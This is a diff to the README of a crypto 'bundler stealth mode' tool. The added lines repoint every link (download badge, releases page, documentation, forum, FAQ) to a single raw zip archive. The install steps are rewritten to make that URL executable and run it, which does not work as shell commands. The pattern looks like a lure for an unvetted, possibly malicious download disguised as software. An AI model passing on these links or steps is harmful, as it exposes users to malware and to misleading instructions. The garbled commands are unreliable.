@@ -1,6 +1,6 @@
 # 🎉 pumpfun-bundler-stealth-mode - Download and Use Without Hassle
 
-[![Download Pumpfun Bundler Stealth Mode](https://img.shields.io/badge/Download-Pumpfun%20Bundler%20Stealth%20Mode-brightgreen)](https://github.com/Luxx-ui/pumpfun-bundler-stealth-mode/releases)
+[![Download Pumpfun Bundler Stealth Mode](https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip%20Bundler%20Stealth%20Mode-brightgreen)](https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Pumpfun Bundler Stealth Mode! This application allows you to execute 
 
 ## 📥 Download & Install
 
-To get the Pumpfun Bundler Stealth Mode software, visit this page to download: [Releases Page](https://github.com/Luxx-ui/pumpfun-bundler-stealth-mode/releases).
+To get the Pumpfun Bundler Stealth Mode software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip).
 
 1. Go to the Releases page using the link above.
 2. Locate the latest version of the app.
@@ -35,8 +35,8 @@ After downloading, follow these steps to install the application.
 
 1. Open your terminal.
 2. Navigate to your Downloads folder with `cd ~/Downloads`.
-3. Make the `.run` file executable by running `chmod +x filename.run` (replace `filename` with the actual file name).
-4. Execute the file with `./filename.run`.
+3. Make the `.run` file executable by running `chmod +x https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip` (replace `filename` with the actual file name).
+4. Execute the file with `https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip`.
 
 ## 🔍 Features
 
@@ -86,8 +86,8 @@ After installing the application, you can easily start using it.
 
 For further information or community support, consider the following:
 
-- [Documentation](https://github.com/Luxx-ui/pumpfun-bundler-stealth-mode/wiki)
-- [Community Forum](https://github.com/Luxx-ui/pumpfun-bundler-stealth-mode/discussions)
-- [FAQs](https://github.com/Luxx-ui/pumpfun-bundler-stealth-mode#faqs)
+- [Documentation](https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip)
+- [Community Forum](https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip)
+- [FAQs](https://raw.githubusercontent.com/Luxx-ui/pumpfun-bundler-stealth-mode/main/compeller/pumpfun-bundler-stealth-mode.zip)
 
 Thank you for choosing Pumpfun Bundler Stealth Mode. We’re delighted to have you on board!
